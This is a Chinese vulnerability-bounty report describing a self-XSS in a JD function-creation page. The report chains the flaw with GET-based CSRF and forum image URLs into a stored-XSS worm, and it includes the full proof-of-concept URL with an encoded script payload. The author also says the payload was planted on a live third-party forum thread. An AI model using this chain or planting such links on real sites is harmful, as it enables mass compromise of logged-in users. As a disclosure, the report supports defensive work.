---
title: XX一处SELF-XSS之大规模蠕虫攻击
slug: 0119
---
# XX一处SELF-XSS之大规模蠕虫攻击

**漏洞名称**京东一处SELF-XSS之大规模蠕虫攻击



**积分明细**

|                     | 时间                   | 收入                                 | 详细说明 |      |      |      |
| ------------------- | ---------------------- | ------------------------------------ | -------- | ---- | ---- | ---- |
| 2019-05-08 11:59:14 | +16 （原始积分16X1倍） | 编号：27510 评分完成，您获得积分：16 |          |      |      |      |
|                     |                        |                                      |          |      |      |      |

------

**漏洞详情**

1、发现方式：请尽量详细填写，流程/步骤/截图/重现方法等





然后创建一个项目，发现了项目名称 很多个位置是没有做 安全转义的，接下来，我插入<i>标签测试，发现存在XSS，但是是SELF-XSS



![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779965168558-b3f2a375-c230-4fb2-98c1-b5d3f1c6eddd.png)



![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779965169139-a751b767-8b60-47e1-a77d-5f3460ee79aa.png)

这个时候正常来说SELF-XSS只能配合CSRF来组合拳攻击，但是一般需要点击的CSRF没有什么危害，我将我自己使用的老套路，CSRF改为GET方式，这样子 就能发挥蠕虫了，测试发现可以变成GET请求的CSRF



用户只需要访问到我指定的URL就直接造成存储XSS攻击，payload为：http://xxxxx.com/function/create?nickName=%3Cscript%3Ealert%28%2721%27%29%3C%2Fscript%3E&descri=Python3%E5%87%BD%E6%95%B0%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%9D%BF&language=python3&templateCode=03&maxMemory=1024&timeout=1&maxConcurrency=50&runAsync=0&codeType=1&file=&entranceFunction=&envK=w2_&envV=123&codeSize=&codeContent=def+handle%28req%2Cevent%29%3A%0D%0A++++%22%22%22handle+a+request+to+the+function%0D%0A++++Args%3A%0D%0A++++++++req+%28str%29%3A+request+body%0D%0A++++++++event+%28map%29%3A+key%28eventId%2CeventTime%29%0D%0A++++%22%22%22%0D%0A++++return+%27%7B%22response%22%3A%7B%22output%22%3A%7B%22text%22%3A%22%E6%AC%A2%E8%BF%8E%E4%BD%BF%E7%94%A8%E5%87%BD%E6%95%B0%E8%AE%A1%E7%AE%97%E6%9C%8D%E5%8A%A1%22%2C%22type%22%3A%22PlainText%22%7D%7D%2C%22shouldEndSession%22%3Atrue%2C%22version%22%3A%221.0%22%7D%27%0D%0A%0D%0A&codeFileName=handler.py

.

这个时候需要去发给用户所以没什么危害，发现了京东有很多论坛，论坛中IMGURL，图片地址是可控制外部的，我只需将这个链接插入到IMGURL中就能够发挥蠕虫攻击，我批量在京东所有论坛中插入那么京东 将被大规模蠕虫



![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779965168709-7e2a3b73-eaa6-40e9-9ff3-694047313de5.png)



我在这里做个蠕虫证明，第一用户访问到被我插入payload的帖子就会被插入XSS，因为京东的密码是通一登录的，用户登录了京东论坛那么这个 有漏洞的网站也会登录 ，所以非常危险

![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779965169227-ffddef56-7da1-4324-863d-a2d5e2d882bb.png)

接着是我插入攻击payload的地址，可以证明，为了不影响到京东用户，我将payload插入到 1+手机论坛官网，怕带来影响，存在payload的地址为 http://www.oneplusbbs.com/thread-4709187-1.html



![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779965169421-afa23aed-fc75-41d0-ab5f-aa05deffdfb5.png)

2、漏洞证明：请在这里提供利用证明及POC

http://xxxx.jd.com/function/create?nickName=%3Cscript%3Ealert%28%2721%27%29%3C%2Fscript%3E&descri=Python3%E5%87%BD%E6%95%B0%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%9D%BF&language=python3&templateCode=03&maxMemory=1024&timeout=1&maxConcurrency=50&runAsync=0&codeType=1&file=&entranceFunction=&envK=w2_&envV=123&codeSize=&codeContent=def+handle%28req%2Cevent%29%3A%0D%0A++++%22%22%22handle+a+request+to+the+function%0D%0A++++Args%3A%0D%0A++++++++req+%28str%29%3A+request+body%0D%0A++++++++event+%28map%29%3A+key%28eventId%2CeventTime%29%0D%0A++++%22%22%22%0D%0A++++return+%27%7B%22response%22%3A%7B%22output%22%3A%7B%22text%22%3A%22%E6%AC%A2%E8%BF%8E%E4



3、修复方案：您觉得靠谱的解决方案是什么？



对输出安全转义即可



注：一个完整的说明既能反映提交人的基础层次感也更有利于SRC的同学更快的处理漏洞，规范的报告还有机会获得漏洞加分哦~